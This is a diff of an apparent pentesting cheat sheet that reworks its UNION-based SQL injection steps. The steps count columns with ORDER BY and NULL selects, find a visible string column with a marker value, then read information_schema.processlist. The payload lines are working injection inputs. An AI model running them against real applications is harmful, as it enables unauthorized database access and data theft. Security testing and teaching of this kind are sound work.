@@ -175,21 +175,25 @@ Columns | column_name FROM all_tab_columns
 
 > **SQL Injection Union**
 
-Once you have identified SQL injection, use order by or UNION select to determine the number of columns:
+1) Once you have identified SQL injection, use order by or UNION select to determine the number of columns:
 {% highlight sql %}
 dent' and 'a'='a' ORDER BY 1; #
 ...until it breaks
 dent' and 'a'='a' ORDER BY 5; #
 
-Dent' UNION SELECT  '1'; #
+Dent' UNION SELECT  NULL; #
 ..until it works
-Dent' UNION SELECT  '1', '2', '3', '4'; #
+Dent' UNION SELECT  NULL, NULL, NULL, NULL; #
 {% endhighlight %}
- See which fields (e.g., numbers) are visable in the output. 
+
+2) See which columns (e.g., numbers) are visable and correct data type (e.g., String/varchar) in the output. 
 {% highlight sql %}
-Dent' UNION SELECT  '1', '2', '3', '4'; #
+Dent' UNION SELECT  'X3Y2Z1', NULL, NULL, NULL; #
+...until it works and visable in source (search for X3Y2Z1)
+Dent' UNION SELECT  NULL, NULL, NULL, 'X3Y2Z1'; #
 {% endhighlight %}
-From the visable numbers select one for the union. <br> *Note: It requires the same number of columns and compatable data type*
+
+3) From the columns identified above, use one for the union. <br> *Note: It requires the same number of columns and compatable data type*
 {% highlight sql %}
 Dent' UNION SELECT  '1', '2', '3', info FROM information_schema.processlist; #
 <br>
